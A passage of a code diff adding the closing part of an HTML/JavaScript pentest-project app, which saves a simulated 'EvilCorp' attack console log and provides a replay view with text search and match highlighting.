+    this.log('[+] All phases completed. Loading project into ArmyOfOne...', 'success');
+    await this.waitOrAbort(this.getPhaseDelay());
+
+    // Capture console output before closing
+    this.projectData.consoleLog = {
+      terminalHTML: document.getElementById('sim-terminal').innerHTML,
+      assetsHTML: document.getElementById('sim-assets').innerHTML,
+      findingsHTML: document.getElementById('sim-findings').innerHTML,
+      vulnsHTML: document.getElementById('sim-vulns').innerHTML,
+      timestamp: new Date().toISOString(),
+    };
+
+    // Save and load
+    App.project = this.projectData;
+    Storage.save(this.projectData);
+
+    // Close overlay and show app
+    document.getElementById('sim-overlay').classList.remove('visible');
+    App.showApp();
+    UI.toast('EvilCorp simulation loaded — explore the findings!');
+    this.running = false;
+  }
+};
+
+/* ============================================================
+   CONSOLE VIEW — Replay simulation log after completion
+   ============================================================ */
+const ConsoleView = {
+  matches: [],
+  currentMatch: -1,
+
+  open() {
+    const log = App.project && App.project.consoleLog;
+    if (!log || !log.terminalHTML) {
+      UI.toast('No console log available', 'error');
+      return;
+    }
+
+    const overlay = document.getElementById('sim-overlay');
+
+    // Set replay mode
+    overlay.classList.add('replay');
+
+    // Update header
+    document.getElementById('sim-title').innerHTML = '&#128187; Console Log — ' + UI.escapeHTML(App.project.project.name || 'EvilCorp');
+    document.getElementById('sim-phase-label').textContent = 'Recorded: ' + new Date(log.timestamp).toLocaleString();
+
+    // Show close button, hide live controls
+    document.getElementById('sim-close-btn').style.display = '';
+
+    // Show search bar
+    document.getElementById('sim-search-bar').style.display = '';
+    document.getElementById('sim-search-input').value = '';
+    document.getElementById('sim-search-count').textContent = '';
+
+    // Set progress to 100%
+    document.getElementById('sim-progress-fill').style.width = '100%';
+
+    // Load saved content
+    document.getElementById('sim-terminal').innerHTML = log.terminalHTML;
+    document.getElementById('sim-assets').innerHTML = log.assetsHTML || '';
+    document.getElementById('sim-findings').innerHTML = log.findingsHTML || '';
+    document.getElementById('sim-vulns').innerHTML = log.vulnsHTML || '';
+
+    // Make all lines visible immediately (no animation in replay)
+    document.querySelectorAll('#sim-terminal .line').forEach(l => {
+      l.style.opacity = '1';
+      l.style.animation = 'none';
+    });
+    document.querySelectorAll('#sim-sidebar .sim-item').forEach(l => {
+      l.style.opacity = '1';
+      l.style.animation = 'none';
+    });
+
+    // Show overlay
+    overlay.classList.add('visible');
+
+    // Reset search state
+    this.matches = [];
+    this.currentMatch = -1;
+
+    // Focus search input
+    setTimeout(() => document.getElementById('sim-search-input').focus(), 200);
+  },
+
+  close() {
+    const overlay = document.getElementById('sim-overlay');
+    overlay.classList.remove('visible', 'replay');
+
+    // Reset header for next live simulation
+    document.getElementById('sim-title').innerHTML = '&#9889; EVILCORP.LOCAL — Attack Simulation';
+    document.getElementById('sim-phase-label').textContent = 'Initializing...';
+    document.getElementById('sim-close-btn').style.display = 'none';
+    document.getElementById('sim-search-bar').style.display = 'none';
+
+    // Clear highlights
+    this.clearHighlights();
+  },
+
+  search(query) {
+    this.clearHighlights();
+    this.matches = [];
+    this.currentMatch = -1;
+
+    if (!query || query.length < 2) {
+      document.getElementById('sim-search-count').textContent = '';
+      return;
+    }
+
+    const terminal = document.getElementById('sim-terminal');
+    const lines = terminal.querySelectorAll('.line');
+    const lowerQuery = query.toLowerCase();
+
+    lines.forEach(line => {
+      if (line.textContent.toLowerCase().includes(lowerQuery)) {
+        line.classList.add('highlight');
+        this.matches.push(line);
+      }
+    });
+
+    const count = this.matches.length;
+    document.getElementById('sim-search-count').textContent = count > 0 ? `${count} match${count !== 1 ? 'es' : ''}` : 'No matches';
+
+    if (count > 0) {
+      this.currentMatch = 0;
+      this.scrollToMatch();
+    }
+  },
+
+  nextMatch() {
+    if (this.matches.length === 0) return;
+    this.currentMatch = (this.currentMatch + 1) % this.matches.length;
+    this.scrollToMatch();
+  },
+
+  prevMatch() {
+    if (this.matches.length === 0) return;
+    this.currentMatch = (this.currentMatch - 1 + this.matches.length) % this.matches.length;
+    this.scrollToMatch();
+  },
+
+  scrollToMatch() {
+    if (this.currentMatch < 0 || this.currentMatch >= this.matches.length) return;
+
+    // Remove active highlight from all
+    this.matches.forEach(m => m.style.outline = '');
+
+    // Highlight current
+    const el = this.matches[this.currentMatch];
+    el.style.outline = '1px solid var(--accent)';
+    el.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+    document.getElementById('sim-search-count').textContent =
+      `${this.currentMatch + 1} / ${this.matches.length}`;
+  },
+
+  clearHighlights() {
+    document.querySelectorAll('#sim-terminal .line.highlight').forEach(l => {
+      l.classList.remove('highlight');
+      l.style.outline = '';
+    });
+  }
+};
+
+/* ============================================================
+   BOOT
+   ============================================================ */
+document.addEventListener('DOMContentLoaded', () => App.init());
+</script>
+</body>
+</html>
